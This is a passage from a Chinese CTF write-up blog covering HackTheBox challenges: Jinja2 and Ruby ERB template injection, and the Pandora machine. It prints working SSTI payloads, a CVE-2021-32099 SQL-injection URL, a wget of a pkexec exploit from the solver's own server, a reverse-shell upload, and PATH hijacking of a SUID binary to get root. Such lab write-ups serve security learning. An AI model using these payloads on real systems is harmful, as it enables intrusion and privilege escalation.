class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: db.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rite_of_passage</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @functools.wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">born2pwn</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line"></span><br><span class="line">        name = request.args.get(<span class="string">'name'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name:</span><br><span class="line">            query_db(<span class="string">'INSERT INTO ninjas (name) VALUES ("%s")'</span> % name)</span><br><span class="line"></span><br><span class="line">            report = render_template_string(acc_tmpl.</span><br><span class="line">                replace(<span class="string">'baby_ninja'</span>, query_db(<span class="string">'SELECT name FROM ninjas ORDER BY id DESC'</span>, one=<span class="literal">True</span>)[<span class="string">'name'</span>]).</span><br><span class="line">                replace(<span class="string">'reb_num'</span>, query_db(<span class="string">'SELECT COUNT(id) FROM ninjas'</span>, one=<span class="literal">True</span>).itervalues().next())</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">'leader'</span>): </span><br><span class="line">                <span class="keyword">return</span> report</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'welcome.jinja2'</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> born2pwn</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="meta">@rite_of_passage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/debug')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> Response(open(__file__).read(), mimetype=<span class="string">'text/plain'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">1337</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>发现在<code>rite_of_passage</code>函数的<code>born2pwn</code>调用里存在ssti：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">report = render_template_string(acc_tmpl.</span><br><span class="line">    replace(<span class="string">'baby_ninja'</span>, query_db(<span class="string">'SELECT name FROM ninjas ORDER BY id DESC'</span>, one=<span class="literal">True</span>)[<span class="string">'name'</span>]).</span><br><span class="line">    replace(<span class="string">'reb_num'</span>, query_db(<span class="string">'SELECT COUNT(id) FROM ninjas'</span>, one=<span class="literal">True</span>).itervalues().next())</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>render_template_string</code>的传参收到我们输入的name影响。</p><p>但是存在着两个问题:</p><p>1.无论输入什么都没用什么明显区别且有意义的回显。</p><p>2<code>{ {</code>、<code>&#39;</code>、<code>&quot;</code>这几个符号被ban。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="image-20220326230753091.png" alt="image-20220326230753091"></p><p>但是无意中发现，开了报错页面</p><p><img src="image-20220326232127657.png" alt="image-20220326232127657"></p><p>因此我们可以用include 和报错来回显我们输入内容。同时，用<code>request.args</code>来传递参数来传递字符串来绕过引号。</p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#123;%25include%201.__class__.__base__.__subclasses__()[-6].__init__.__globals__.os.popen(request.args.xxx).read()|string%25&#125;&amp;xxx&#x3D;cat%20f*</span><br></pre></td></tr></table></figure><p>、从而得到flag：</p><p><img src="image-20220326141147608.png" alt="image-20220326141147608"></p><h2 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h2><p>在查看其他大佬的思路时发现他们是利用<code>session.update</code>来更新session来回显。</p><p><code>session.update</code>方法可以根据我们传入的字典来重新生成session，用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.update(dict)</span><br><span class="line">//ps</span><br><span class="line">session.update(&#123;<span class="string">'a'</span>:<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure><p>于是构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#123;%print%20session.update(&#123;dict(a&#x3D;1)|list|last:1.__class__.__base__.__subclasses__()[-6].__init__.__globals__.os.popen(request.args.xxx).read()&#125;)%&#125;&amp;xxx&#x3D;cat%20fA*</span><br></pre></td></tr></table></figure><p><img src="image-20220326235131162.png" alt="image-20220326235131162"></p><p>解base64后得到flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lexs@DESKTOP-MAKMNL3:~$ echo eyJhIjp7IiBiIjoiU0ZSQ2UySTBZbmxmYm1sdWFqUnpYMlF3Ym5SZlp6TjBYM0YxTUhRelpGOHdjbDlqTkhWbmFGUjl</span><br><span class="line">DZz09In19.Yj82BA.RZT3ond24hjE5PZXd2P0P9CHTz|base64 -d</span><br><span class="line">&#123;"a":&#123;" b":"SFRCe2I0YnlfbmluajRzX2QwbnRfZzN0X3F1MHQzZF8wcl9jNHVnaFR9Cg=="&#125;&#125;base64: invalid input</span><br><span class="line">lexs@DESKTOP-MAKMNL3:~$ echo SFRCe2I0YnlfbmluajRzX2QwbnRfZzN0X3F1MHQzZF8wcl9jNHVnaFR9Cg==|base64 -d</span><br><span class="line">HTB&#123;b4by_ninj4s_d0nt_g3t_qu0t3d_0r_c4ughT&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://lexsd6.github.io/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/">https://lexsd6.github.io/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/</a></p><p><a href="https://lexsd6.github.io/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">https://lexsd6.github.io/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/</a></p><p><a href="https://www.zapstiko.com/baby-ninja-jinja-challenge-htb-by-raihan-biswas/" target="_blank" rel="noopener">https://www.zapstiko.com/baby-ninja-jinja-challenge-htb-by-raihan-biswas/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Neonify-web-challenge-wp</title>
      <link href="/2022/03/26/HTB-Neonify-web-challenge-wp/"/>
      <url>/2022/03/26/HTB-Neonify-web-challenge-wp/</url>
      
        <content type="html"><![CDATA[<p>第一次遇到ruby后端,感觉ruby语法也有点意思<a id="more"></a><br><img src="image-20220401113528771.png" alt="image-20220401113528771"></p><h2 id="漏洞查询"><a href="#漏洞查询" class="headerlink" title="漏洞查询"></a>漏洞查询</h2><p>分析题目源码：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeonControllers</span> &lt; Sinatra::Base</span></span><br><span class="line"></span><br><span class="line">  configure <span class="keyword">do</span></span><br><span class="line">    set <span class="symbol">:views</span>, <span class="string">"app/views"</span></span><br><span class="line">    set <span class="symbol">:public_dir</span>, <span class="string">"public"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  get <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">    @neon = <span class="string">"Glow With The Flow"</span></span><br><span class="line">    erb <span class="symbol">:<span class="string">'index'</span></span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  post <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> params[<span class="symbol">:neon</span>] =~ <span class="regexp">/^[0-9a-z ]+$/i</span></span><br><span class="line">      @neon = ERB.new(params[<span class="symbol">:neon</span>]).result(binding)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      @neon = <span class="string">"Malicious Input Detected"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    erb <span class="symbol">:<span class="string">'index'</span></span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>发现题目是ruby语言写的后端。进行代码审计发现<code>if params[:neon] =~ /^[0-9a-z ]+$/i</code> 发现存在换行绕过。</p><p><img src="image-20220326111436835.png" alt="image-20220326111436835"></p><p>于是<code>neon=1111%0axxxxj!&lt;&gt;</code>绕过正则限制.</p><p><img src="image-20220326111830872.png" alt="image-20220326111830872"></p><p>然后，一下找不到什么利用点了，但是百度下ERB发现是Embedded RuBy的简称，意思是嵌入式的Ruby，是一种文本模板技术.语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;% %&gt;</span><br><span class="line">在括号内执行ruby代码。</span><br><span class="line"></span><br><span class="line">&lt;%&#x3D; %&gt;</span><br><span class="line">在ERB文件中打印一些东西。</span><br><span class="line"></span><br><span class="line">&lt;% -%&gt;</span><br><span class="line">避免在表达式后中断行。</span><br><span class="line"></span><br><span class="line">&lt;%# %&gt;</span><br><span class="line">括号内的注释；未发送到客户端(与HTML注释相反)。</span><br></pre></td></tr></table></figure><p>其中提到一个例子：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlTemplate = ERB.new <span class="string">%q&#123;  </span></span><br><span class="line"><span class="string">&lt;%for organization in domains.keys%&gt;  </span></span><br><span class="line"><span class="string">    insert into org_domain(Domain, organization) values('&lt;%=domains[organization]%&gt;','&lt;%=organization%&gt;');  </span></span><br><span class="line"><span class="string">&lt;%end%&gt;  </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>因此猜测在<code>ERB.new(params[:neon]).result(binding)</code>处用ssti.</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们可以通过<code>&lt;% %&gt;</code>来执行代码，但是我们看不到回显。下面例子可以看到程序因为找不到xxx而报错。说明我们的代码被执行了。</p><p><img src="image-20220326112945963.png" alt="image-20220326112945963"></p><p>但是传统的system,exec都无法直接回显。都要通过vps反弹shell。</p><p>通过收集资料发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file &#x3D; &#39;|whoami&#39;</span><br><span class="line">puts open(file).read()  # ubuntu</span><br><span class="line">puts open(file).gets    # ubuntu</span><br></pre></td></tr></table></figure><p>open可以回显出命令执行结果。</p><p>因此我们构造payload即可得到flag</p><p><code>neon=1111%0axxxxj!&lt;/h1&gt;&lt;%25=open(&#39;|cat f*&#39;).read()%25&gt;&lt;h1&gt;</code></p><p><img src="image-20220326120227996.png" alt="image-20220326120227996"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.cnblogs.com/cuimiemie/p/6442695.html" target="_blank" rel="noopener">https://www.cnblogs.com/cuimiemie/p/6442695.html</a></p><p><a href="https://droidyue.com/blog/2014/11/18/six-ways-to-run-shell-in-ruby/" target="_blank" rel="noopener">https://droidyue.com/blog/2014/11/18/six-ways-to-run-shell-in-ruby/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ruby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Pandora-Machine-wp</title>
      <link href="/2022/03/08/HTB-Pandora-wp/"/>
      <url>/2022/03/08/HTB-Pandora-wp/</url>
      
        <content type="html"><![CDATA[<p>hackthebox-Pandora-Machine <a id="more"></a></p><p><img src="image-20220310162659811.png" alt="image-20220310162659811"></p><h2 id="个人思路"><a href="#个人思路" class="headerlink" title="个人思路"></a>个人思路</h2><p>拿到题目先用nmap执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sU  10.10.11.136</span><br></pre></td></tr></table></figure><p>扫描下其端口服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─# nmap -sS -sU  10.10.11.136                                             </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-08 23:53 CST</span><br><span class="line">Stats: 0:17:29 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 99.91% done; ETC: 00:10 (0:00:01 remaining)</span><br><span class="line">Nmap scan report for 10.10.11.136</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 1994 closed ports</span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">22/tcp    open          ssh</span><br><span class="line">80/tcp    open          http</span><br><span class="line">161/udp   open|filtered snmp</span><br><span class="line">1032/udp  open|filtered iad3</span><br><span class="line">31731/udp open|filtered unknown</span><br><span class="line">36669/udp open|filtered unknown</span><br></pre></td></tr></table></figure><p>发现有熟悉的80端口，用浏览器去访问下</p><p><img src="image-20220309102901245.png" alt="image-20220309102901245"></p><p>发现除了静态前端外，基本没有什么敏感点。</p><p><img src="image-20220309104114607.png" alt="image-20220309104114607"></p><p>除了有一次看起来有问题的信息反馈，但测试下在我们前端并无明显反馈，且不像用sql注入之内的的漏洞，更像是功能没用写全……</p><p>然后看下DNS映射，<code>Pandora.htb</code>域名对外映射的就是我们访问的web服务。</p><p>没用什么思路，用dirseach 扫描下路径看下有没有什么有用的信息。</p><p>执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u 10.10.11.136</span><br></pre></td></tr></table></figure><p>得到结果：</p><p><img src="image-20220309111906091.png" alt="image-20220309111906091"></p><p>仔细审查下，发现assets目录貌似有一个目录穿越</p><p><img src="image-20220309112415563.png" alt="image-20220309112415563"></p><p>然后发现都跟页面显示相关……没有什么可以利用点。</p><p>回到nmap信息，发现除了ssh服务和web服务还有snmp服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">161&#x2F;udp   open|filtered snmp</span><br></pre></td></tr></table></figure><p>先用<code>searchsploit  snmp</code>查询下发现这个服务还挺多问题的：</p><p><img src="image-20220309130158869.png" alt="image-20220309130158869"></p><p>通过谷歌找了篇文章来了解snmp的大概：</p><p><a href="https://www.anquanke.com/post/id/260832" target="_blank" rel="noopener">https://www.anquanke.com/post/id/260832</a></p><p>了解到SNMP协议主要用来接收网络节点的通知消息和警告时间报告等，从而获知网络出现的问题。</p><p>而文章中提到了一种工具 snmpwalk，snmpwalk是SNMP的一个工具，它使用SNMP的GETNEXT请求查询指定OID（SNMP协议中的对象标识）入口的所有OID树信息，并显示给用户。snmpwalk使用方法很简单，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v 1或2c(代表SNMP版本) -c SNMP读团体密码 IP地址 OID(对象标示符)</span><br><span class="line">–v：指定snmp的版本, 1或者2c，该参数必须有。</span><br><span class="line">–c：指定连接设备SNMPSNMP读团体密码，该参数必须有。 密码一般在snmpd.conf中,默认为public</span><br><span class="line">IP：指定要walk的设备的IP地址，该参数必须有。</span><br><span class="line">OID：代表要获取设备的指标oid，该参数不是必须的。</span><br></pre></td></tr></table></figure><p>具体可以查看：</p><p><a href="https://www.cnblogs.com/--smile/p/11086770.html" target="_blank" rel="noopener">https://www.cnblogs.com/--smile/p/11086770.html</a></p><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v 2c Pandora.htb –c public &gt; 1.txt</span><br></pre></td></tr></table></figure><p>在1.txt 发现一个有意识的命令执行记录：</p><p><img src="image-20220309223818806.png" alt="image-20220309223818806"></p><p>推测是有个用户名为dantel 密码为HotelBabylon23</p><p>用ssh 登录看看</p><p><img src="image-20220309231540290.png" alt="image-20220309231540290"></p><p>发现成功登录，但user flag 在另一个用户目录下没有权限读取。</p><p><img src="image-20220309231702161.png" alt="image-20220309231702161"></p><p>这里用<code>lsb_release -a</code>  和<code>uname -r</code>来查询发行版本与内核版本。</p><p><img src="image-20220309232153234.png" alt="image-20220309232153234"></p><p>发现是Ubuntu 20.04.3 LTS，于是谷歌下发现有CVE-2021-4034提取。在github上找了个poc：</p><p><a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py" target="_blank" rel="noopener">https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py</a></p><p>用python 来搭建简单http服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9090</span><br></pre></td></tr></table></figure><p>执行上面命令。在自己的电脑9090端口开启web服务。</p><p>在靶场机器上执行<code>wget 10.10.14.94:9090/cve2021-4034.py</code>来获取poc：</p><p><img src="image-20220309233250045.png" alt="image-20220309233250045"></p><p>执行poc，来获得root:</p><p><img src="image-20220309233402834.png" alt="image-20220309233402834"></p><p>这里一下全到root才发现自己可能非预期了，但已经有权限读取root.txt和user.txt了</p><p><img src="image-20220309233503275.png" alt="image-20220309233503275"></p><h2 id="正常解法"><a href="#正常解法" class="headerlink" title="正常解法"></a>正常解法</h2><p>在看了其他大佬wp发现自己完全避开，关键点…..tcl.</p><p>由于daniel用法在curl 80端口时出现不同页面，所有怀疑有内网服务。</p><p>用命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8001:127.0.0.1:80  daniel@10.10.11.136</span><br></pre></td></tr></table></figure><p>来转发端口，可以看到有个全新web页面</p><p><img src="image-20220310150454237.png" alt="image-20220310150454237"></p><p>根据下方提示版本，谷歌后发现是Pandora模板（正好点题）</p><p>d但是我们不知道后台密码，经过谷歌后发现CVE-2021-32099可以通过sql注入获得admin cookie</p><p>poc 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27&#x3D;%271</span><br></pre></td></tr></table></figure><p>然后我们进入管理页面，</p><p><img src="image-20220310150437770.png" alt="image-20220310150437770"></p><p>在后门页面的admin tools 的文件管理里上传后门反弹shell文件</p><p><img src="image-20220310150914241.png" alt="image-20220310150914241"></p><p>通过base64 解密url中base64部分得到相对位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─# echo L3BhbmRvcmFfY29uc29sZS9pbmNsdWRlLy4uLy9hdHRhY2htZW50L2ZpbGVzX3JlcG8vMV9hYWEucGhw|base64 -d</span><br><span class="line">&#x2F;pandora_console&#x2F;include&#x2F;..&#x2F;&#x2F;attachment&#x2F;files_repo&#x2F;1_aaa.php</span><br></pre></td></tr></table></figure><p>访问后门得到shell</p><p><img src="image-20220310143003847.png" alt="image-20220310143003847"></p><p>用<code>find / -perm -u=s 2&gt; /dev/null</code> 找是否用权限配置有问题的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pandora_backup</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;at</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br></pre></td></tr></table></figure><p>发现/usr/bin/pandora_backup 有点可疑。</p><p>运行后，shell崩了，可能用什么报错信息未看到，用python 加固shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>cp  pandora_backup  到web 目录<code>/var/www/pandora/pandora_console/images</code>下,在我们用户机器上访问下载。</p><p>在ida 里F5反汇编:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__uid_t</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">__uid_t</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = getuid();</span><br><span class="line">  v4 = geteuid();</span><br><span class="line">  setreuid(v4, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"PandoraFMS Backup Utility"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Now attempting to backup PandoraFMS client"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( system(<span class="string">"tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Backup failed!\nCheck your permissions!"</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Backup successful!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Terminating program!"</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现程序调用tar 但是使用system来调用，没用明确是哪个tar，我们可以伪造一个tar添加到环境变量中，让系统调用我们就可</p><p>切换到matt的用户目录，然后创建由<code>/bin/bash</code>一个假的tar可执行文件，并将matt的家路径注入PATH变量中,这样可以在<code>tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*</code>命令结束后仍然在/bin/bash命令中</p><p>这是本地用/bin/sh做的实验：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─# .&#x2F;tar -cvf &#x2F;root&#x2F;.backup&#x2F;pandora-backup.tar.gz &#x2F;var&#x2F;www&#x2F;pandora&#x2F;pandora_console</span><br><span class="line"># </span><br><span class="line">#</span><br></pre></td></tr></table></figure><p>因此我们在远程伪造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;matt&#x2F;</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; tar</span><br><span class="line">chmod +x tar</span><br><span class="line">export PATH&#x3D;&#x2F;home&#x2F;matt:$PATH</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pandora_backup</span><br></pre></td></tr></table></figure><p>然后得到root</p>]]></content>
      
      
      <categories>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HSC2021-CTF-pwn</title>
      <link href="/2022/02/22/HSC2021-CTF/"/>
      <url>/2022/02/22/HSC2021-CTF/</url>
      
        <content type="html"><![CDATA[<p>红客突击队ctf，好久没打ctf了，正好适合用来练手，感觉自己又变菜了……<a id="more"></a></p><h2 id="EZ-pwn"><a href="#EZ-pwn" class="headerlink" title="EZ_pwn"></a>EZ_pwn</h2><p>真ez pwn 题目给了后门，栈溢出改RIP为后门地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   